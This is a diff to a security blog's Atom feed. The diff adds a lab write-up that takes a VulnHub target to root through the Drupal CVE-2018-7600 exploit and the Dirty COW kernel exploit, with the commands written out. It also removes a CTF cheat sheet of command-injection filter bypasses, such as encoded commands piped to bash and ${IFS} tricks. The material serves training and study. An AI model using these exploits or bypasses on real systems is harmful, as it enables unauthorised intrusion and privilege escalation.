@@ -6,7 +6,7 @@
   <link href="https://sakurahack-y.github.io/atom.xml" rel="self"/>
   
   <link href="https://sakurahack-y.github.io/"/>
-  <updated>2022-01-04T06:09:35.313Z</updated>
+  <updated>2022-01-04T11:25:47.811Z</updated>
   <id>https://sakurahack-y.github.io/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Linux脏牛提权</title>
+    <link href="https://sakurahack-y.github.io/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/"/>
+    <id>https://sakurahack-y.github.io/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/</id>
+    <published>2022-01-04T06:17:11.000Z</published>
+    <updated>2022-01-04T11:25:47.811Z</updated>
+    
+    <content type="html"><![CDATA[<p>脏牛漏洞，又叫Dirty COW，存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞。Linux kernel团队在2016年10月18日已经对此进行了修复。</p><p>漏洞范围：Linux内核 &gt;= 2.6.22（2007年发行，到2016年10月18日才修复）</p><p>简要分析：该漏洞具体为，Linux内核的内存子系统在处理写入复制（copy-on-write, COW）时产生了竞争条件（race condition）。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限。</p><p>复现：</p><p>环境：Ubuntu 14.04.5</p><p>靶场下载地址:<a href="https://www.vulnhub.com/entry/lampiao-1,249/">Lampião: 1 ~ VulnHub</a></p><p>开启kali，靶机，配置使其位于同一网段</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104144958930.png" alt="image-20220104144958930"></p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104144854766.png" alt="image-20220104144854766"></p><p>使用nmap对ip段进行扫描</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104144833775.png" alt="image-20220104144833775"></p><p>发现可疑ip  192.168.64.129</p><p>打开</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145052541.png" alt="image-20220104145052541"></p><p>没有发现有用信息，对其端口进行进一步探测</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145423615.png" alt="image-20220104145423615"></p><p>发现 1898端口</p><p>打开，网页如图</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145547619.png" alt="image-20220104145547619"></p><p>在底部发现cms为Drupal</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145621761.png" alt="image-20220104145621761"></p><p>探测其版本为 Drupal7</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104150839353.png" alt="image-20220104150839353"></p><p>百度一下，发现其存在 远程代码执行漏洞 CVE-2018-7600</p><p>打开msf搜索相关漏洞</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145741167.png" alt="image-20220104145741167"></p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104151550089.png" alt="image-20220104151550089"></p><p>配置参数，进行攻击</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104151627775.png" alt="image-20220104151627775"></p><p>成功！</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104151712264.png" alt="image-20220104151712264"></p><p>下面上传漏洞检测脚本至目标靶机</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104173845980.png" alt="image-20220104173845980"></p><p>赋予权限并运行</p><pre><code>shellchmod +x sakuras.sh./sakuras.sh</code></pre><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104174121444.png" alt="image-20220104174121444"></p><p>发现了脏牛漏洞，准备开始提权</p><p>准备好exp</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104192056147.png" alt="image-20220104192056147"></p><p>链接：<a href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></p><p>上传 dcow.cpp到靶机 </p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104192200178.png" alt="image-20220104192200178"></p><p>进行编译</p><pre><code>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil</code></pre><p>打开交互式环境</p><pre><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>运行</p><pre><code>./dcow</code></pre><p>成功</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104192407007.png" alt="image-20220104192407007"></p><p>新建ssh链接，或者直接</p><p>su root </p><p>记得切换用户要在交换式窗口下</p><p>成功提权</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104192533247.png" alt="image-20220104192533247"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;脏牛漏洞，又叫Dirty COW，存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞。Linux kernel团队在2016年10月18日已经对此进行了修复。&lt;/p&gt;
+&lt;p&gt;漏洞范围：Linux内核 &amp;gt;= 2.6.22（2</summary>
+      
+    
+    
+    
+    <category term="红队" scheme="https://sakurahack-y.github.io/categories/%E7%BA%A2%E9%98%9F/"/>
+    
+    <category term="提权" scheme="https://sakurahack-y.github.io/categories/%E7%BA%A2%E9%98%9F/%E6%8F%90%E6%9D%83/"/>
+    
+    
+    <category term="提权" scheme="https://sakurahack-y.github.io/tags/%E6%8F%90%E6%9D%83/"/>
+    
+  </entry>
   
   <entry>
     <title>Linux提权本地配合内核漏洞演示</title>
@@ -537,32 +564,6 @@ def getUrl():
     
     
     <category term="文件上传" scheme="https://sakurahack-y.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>命令执行</title>
-    <link href="https://sakurahack-y.github.io/2021/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    <id>https://sakurahack-y.github.io/2021/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
-    <published>2021-10-08T15:23:21.439Z</published>
-    <updated>2021-10-08T16:09:27.385Z</updated>
-    
-    <content type="html"><![CDATA[<p>php调用外部程序常用的函数：<br>system()—执行shell命令也就是向dos发送一条指令。<br>shell_exec() — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。<br>exec() —执行外部程序。<br>passthru() — 执行外部程序并且显示原始输出。</p><p>绕过技巧：<br>一、常见管道符：<br>‘|’ 直接执行后面的语句<br>‘||’ 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>‘&amp;’ 前面和后面命令都要执行，无论前面真假<br>&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令<br>Linux:<br>Linux系统包含了windows系统上面四个之外，还多了一个 ‘;’ 这个作用和 ‘&amp;’ 作用相同<br>二、空格绕过(空格被过滤)：<br>&lt;  –  重定向，如cat&lt;flag.php<br>&lt;&gt;      –   重定向，如cat&lt;&gt;flag.php<br>%09  –  需要php环境，如cat%09flag.php<br>${IFS}  –  单纯cat$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名，如cat${IFS2}flag.php<br>$IFS$9  –  后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php<br>三、黑名单绕过<br>1、拼接<br>a=c;b=at;c=flag;$a$b $c<br>a=c;b=at;c=heb;d=ic;ab{c}{d}<br>2、base64编码<br>echo MTIzCg==|base64 -d 其将会打印123<br>echo “Y2F0IC9mbGFn”|base64-d|bash ==&gt;cat /flag<br>3、hex编码<br>echo “636174202f666c6167” | xxd -r -p|bash ==&gt;cat /flag<br>4、单引号和双引号绕过<br>ca’’t flag 或ca””t flag<br>ca’’t te””st.php<br>5、反斜杠绕过<br>ca\t fl\ag<br>cat te\st.php<br>6、绕过ip中的句点<br>网络地址可以转换成数字地址，比如127.0.0.1可以转化为2130706433。<br>可以直接访问<a href="http://2130706433或者http//0x7F000001%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87.%E7%9A%84ip%E8%BF%87%E6%BB%A4%E3%80%82">http://2130706433或者http://0x7F000001，这样就可以绕过.的ip过滤。</a><br>在线转换地址：数字转IP地址 IP地址转数字 域名转数字IP<br>四、绕过长度限制<br>1，通过&gt;来创建文件</p><blockquote><p>flag.txt<br>2，通过&gt;将命令结果存入文件中<br>echo “hello hacker” &gt; flag.txt<br>3，&gt;&gt;符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容<br>echo “hello hacker” &gt;&gt; flag.txt<br>4、Linux中命令换行<br>在Linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加\，可以将一条命令写在多行。<br>比如：cat flag<br>ca<br>t<br> fla<br>g.txt<br>将命令一条一条输入一个文本中再执行:<br>root@kali:<del># echo “ca\“&gt;cmd<br>root@kali:</del># echo “t\“&gt;&gt;cmd<br>root@kali:<del># echo “ fl\“&gt;&gt;cmd<br>root@kali:</del># echo “ag”&gt;&gt;cmd<br>root@kali:<del># cat cmd<br>ca<br>t<br> fl<br>ag<br>root@kali:</del># sh cmd<br>this is your flag<br>5、ls命令：<br>ls -a 列出文件下所有的文件，包括以“.“开头的隐藏文件（linux下文件隐藏文件是以.开头的，如果存在..代表存在着父目录）。<br>ls -l 列出文件的详细信息，如创建者，创建时间，文件的读写权限列表等等。<br>ls -F 在每一个文件的末尾加上一个字符说明该文件的类型。”@”表示符号链接、”|”表示FIFOS、”/“表示目录、”=”表示套接字。<br>ls -s 在每个文件的后面打印出文件的大小。 size(大小)<br>ls -t 按时间进行文件的排序 Time(时间)<br>ls -A 列出除了”.”和”..”以外的文件。<br>ls -R 将目录下所有的子目录的文件都列出来，相当于我们编程中的“递归”实现<br>ls -L 列出文件的链接名。Link（链接）<br>ls -S 以文件的大小进行排序<br>6、各种读文件命令：<br>cat–由第一行开始显示内容，并将所有内容输出<br>tac–从最后一行倒序显示内容，并将所有内容输出<br>more– 根据窗口大小，一页一页的现实文件内容<br>less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符<br>head– 只显示头几行<br>tail –只显示最后几行<br>nl –类似于cat -n，显示时输出行号<br>tailf– 类似于tail -f<br>vim –使用vim工具打开文本<br>vi –使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出</p></blockquote>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;php调用外部程序常用的函数：&lt;br&gt;system()—执行shell命令也就是向dos发送一条指令。&lt;br&gt;shell_exec() — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。&lt;br&gt;exec() —执行外部程序。&lt;br&gt;passthru()</summary>
-      
-    
-    
-    
-    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
-    
-    <category term="代码\命令执行类" scheme="https://sakurahack-y.github.io/categories/CTF/%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%B1%BB/"/>
-    
-    
-    <category term="命令执行" scheme="https://sakurahack-y.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
   </entry>
   
